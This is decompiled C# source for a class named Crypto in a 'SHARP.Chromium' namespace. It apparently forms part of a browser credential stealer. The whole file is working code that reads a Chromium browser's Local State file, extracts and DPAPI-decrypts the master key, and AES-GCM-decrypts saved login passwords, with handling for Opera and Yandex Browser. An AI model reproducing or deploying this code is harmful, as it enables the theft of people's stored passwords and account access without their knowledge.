﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SHARP.Chromium
{
	// Token: 0x0200007F RID: 127
	internal sealed class Crypto
	{
		// Token: 0x060002A9 RID: 681
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Crypto.DataBlob pCipherText, ref string pszDescription, ref Crypto.DataBlob pEntropy, IntPtr pReserved, ref Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Crypto.DataBlob pPlainText);

		// Token: 0x060002AA RID: 682 RVA: 0x000103DC File Offset: 0x0000E5DC
		public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			Crypto.DataBlob dataBlob = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob2 = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob3 = default(Crypto.DataBlob);
			Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Crypto.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Crypto.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (bCipher == null)
					{
						bCipher = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
					dataBlob2.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
				}
				catch
				{
				}
				try
				{
					if (bEntropy == null)
					{
						bEntropy = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					dataBlob3.cbData = bEntropy.Length;
					Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
				}
				catch
				{
				}
				Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060002AC RID: 684 RVA: 0x000105D0 File Offset: 0x0000E7D0
		private static Task<byte[]> GetEncryptionKey()
		{
			Crypto.<GetEncryptionKey>d__9 <GetEncryptionKey>d__;
			<GetEncryptionKey>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<GetEncryptionKey>d__.<>1__state = -1;
			<GetEncryptionKey>d__.<>t__builder.Start<Crypto.<GetEncryptionKey>d__9>(ref <GetEncryptionKey>d__);
			return <GetEncryptionKey>d__.<>t__builder.Task;
		}

		// Token: 0x060002AD RID: 685 RVA: 0x0001060C File Offset: 0x0000E80C
		public static byte[] GetMasterKey(string sLocalStateFolder)
		{
			string text;
			if (sLocalStateFolder.Contains("Opera"))
			{
				text = sLocalStateFolder + "\\Local State";
			}
			else
			{
				text = sLocalStateFolder + "\\Local State";
			}
			byte[] array = new byte[0];
			if (!File.Exists(text))
			{
				return null;
			}
			if (text != Crypto.sPrevBrowserPath)
			{
				Crypto.sPrevBrowserPath = text;
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				byte[] result;
				try
				{
					Crypto.sPrevMasterKey = Crypto.DPAPIDecrypt(array2, null);
					result = Crypto.sPrevMasterKey;
				}
				catch
				{
					result = null;
				}
				return result;
			}
			return Crypto.sPrevMasterKey;
		}

		// Token: 0x060002AE RID: 686 RVA: 0x0001072C File Offset: 0x0000E92C
		public static string GetUTF8(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		// Token: 0x060002AF RID: 687 RVA: 0x0001076C File Offset: 0x0000E96C
		public static string DecodeBase64String(string base64Data)
		{
			string result;
			try
			{
				byte[] bytes = Convert.FromBase64String(base64Data);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = base64Data;
			}
			return result;
		}

		// Token: 0x060002B0 RID: 688 RVA: 0x000107A4 File Offset: 0x0000E9A4
		public static string ByCryptCi(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(sNonUtf8);
				byte[] bytes2 = Encoding.Convert(Encoding.GetEncoding(1251), Encoding.UTF8, bytes);
				result = Encoding.UTF8.GetString(bytes2);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		// Token: 0x060002B1 RID: 689 RVA: 0x000107FC File Offset: 0x0000E9FC
		public static string flask(string s)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.GetEncoding("Default").GetBytes(s);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = s;
			}
			return result;
		}

		// Token: 0x060002B2 RID: 690 RVA: 0x00010840 File Offset: 0x0000EA40
		public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
		{
			byte[] result;
			try
			{
				byte[] array = new byte[12];
				Array.Copy(bEncryptedData, 3, array, 0, 12);
				cAesGcm cAesGcm = new cAesGcm();
				byte[] array2 = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
				byte[] array3 = new byte[16];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				result = cAesGcm.Decrypt(bMasterKey, array, null, array4, array3);
			}
			catch
			{
				byte[] array5 = new byte[12];
				Array.Copy(bEncryptedData, 3, array5, 0, 12);
				cAesGcm cAesGcm2 = new cAesGcm();
				byte[] array6 = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, array6, 0, bEncryptedData.Length - 15);
				byte[] array7 = new byte[16];
				Array.Copy(array6, array6.Length - 16, array7, 0, 16);
				byte[] array8 = new byte[array6.Length - array7.Length];
				Array.Copy(array6, 0, array8, 0, array6.Length - array7.Length);
				result = cAesGcm2.Decrypt(bMasterKey, array5, null, array8, array7);
			}
			return result;
		}

		// Token: 0x060002B3 RID: 691 RVA: 0x00010964 File Offset: 0x0000EB64
		public static string GetUTF16(string sNonUtf16)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.GetEncoding(sNonUtf16).GetBytes(sNonUtf16);
				result = Encoding.Unicode.GetString(bytes);
			}
			catch
			{
				result = sNonUtf16;
			}
			return result;
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x000109A4 File Offset: 0x0000EBA4
		public static string EasyDecrypt(string sLoginData, string sPassword)
		{
			if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
			{
				byte[] masterKey = Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
				return Encoding.Default.GetString(Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
			}
			return Encoding.Default.GetString(Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x00010A18 File Offset: 0x0000EC18
		public static Task<string> Rypt(string sLoginData, string sPassword)
		{
			Crypto.<Rypt>d__18 <Rypt>d__;
			<Rypt>d__.<>t__builder = AsyncTaskMethodBuilder<string>.Create();
			<Rypt>d__.sPassword = sPassword;
			<Rypt>d__.<>1__state = -1;
			<Rypt>d__.<>t__builder.Start<Crypto.<Rypt>d__18>(ref <Rypt>d__);
			return <Rypt>d__.<>t__builder.Task;
		}

		// Token: 0x060002B6 RID: 694 RVA: 0x00010A5B File Offset: 0x0000EC5B
		public static string BrowserPathToAppName(string sLoginData)
		{
			if (sLoginData.Contains("Opera"))
			{
				return "Opera";
			}
			sLoginData.Replace(Paths.lappdata, "");
			return sLoginData.Split(new char[]
			{
				'\\'
			})[1];
		}

		// Token: 0x0400014B RID: 331
		private static string sPrevBrowserPath = "";

		// Token: 0x0400014C RID: 332
		private static byte[] sPrevMasterKey = new byte[0];

		// Token: 0x0400014D RID: 333
		private static readonly string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex", "YandexBrowser", "User Data");

		// Token: 0x0400014E RID: 334
		private static byte[] _encryptionKey = null;

		// Token: 0x02000162 RID: 354
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000603 RID: 1539
			public int cbSize;

			// Token: 0x04000604 RID: 1540
			public int dwPromptFlags;

			// Token: 0x04000605 RID: 1541
			public IntPtr hwndApp;

			// Token: 0x04000606 RID: 1542
			public string szPrompt;
		}

		// Token: 0x02000163 RID: 355
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000607 RID: 1543
			public int cbData;

			// Token: 0x04000608 RID: 1544
			public IntPtr pbData;
		}
	}
}
